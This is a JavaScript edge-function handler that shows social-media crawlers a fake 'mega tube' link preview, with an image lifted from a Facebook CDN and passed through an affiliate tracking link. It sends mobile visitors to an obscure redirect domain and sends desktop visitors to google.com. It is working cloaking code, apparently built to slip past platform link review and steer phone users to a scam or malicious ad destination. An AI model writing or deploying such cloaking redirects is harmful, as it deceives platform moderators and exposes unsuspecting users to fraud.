export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="❤️mega tube 🧡">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://go.skimresources.com/?id=130832X1595857&isjs=1&jv=15.7.1&sref=https%3A%2F%2Fwww.gminsidenews.com%2Fthreads%2Ftrump-says-he-would-be-ok-with-china-building-cars-in-us.311511%2F&url=https%3A%2F%2Fscontent.fkhi4-2.fna.fbcdn.net%2Fv%2Ft39.30808-6%2F814234276_122111689131465576_6078886896482928675_n.jpg%3Fstp%3Ddst-jpg_tt6%26cstp%3Dmx1200x630%26ctp%3Ds960x960%26_nc_cat%3D100%26_nc_map%3Durlgen_bucketless%26ccb%3D1-7%26_nc_sid%3D127cfc%26_nc_eui2%3DAeHu9w7LaXF4oFCwFwz_DXDF-g6NospmD7L6Do2iymYPsve2UEENQtgdc5VBDAJb8oqBgY53pVqH6lDu9sPdwYFq%26_nc_ohc%3DH2D5h1MCv-cQ7kNvwG9weao%26_nc_oc%3DAdqhXbUrf7afsu8begpeKaRGRxol9Sdty5e-D7cvPUyMnvU8cm8-2eydezl3G0jU1Z4%26_nc_zt%3D23%26_nc_ht%3Dscontent.fkhi4-2.fna%26_nc_gid%3DsTX2dfz6ceNhOg4wK0G9jw%26_nc_ss%3D7b2a8%26oh%3D00_AQIw-U-hMcyj2T4MOvXdTKemMjwMX0dWECnLIrYIUbQSXg%26oe%3D6AB2B536&xs=1&xtz=-300&xuuid=0808f0e4bd0a9b5629d69681a02171b5&xjsf=other_click__auxclick%20%5B2%5D">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://negotiatenapkin.com/xdmz8up55?key=a020f416f71ece8e252f939903b79a97", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
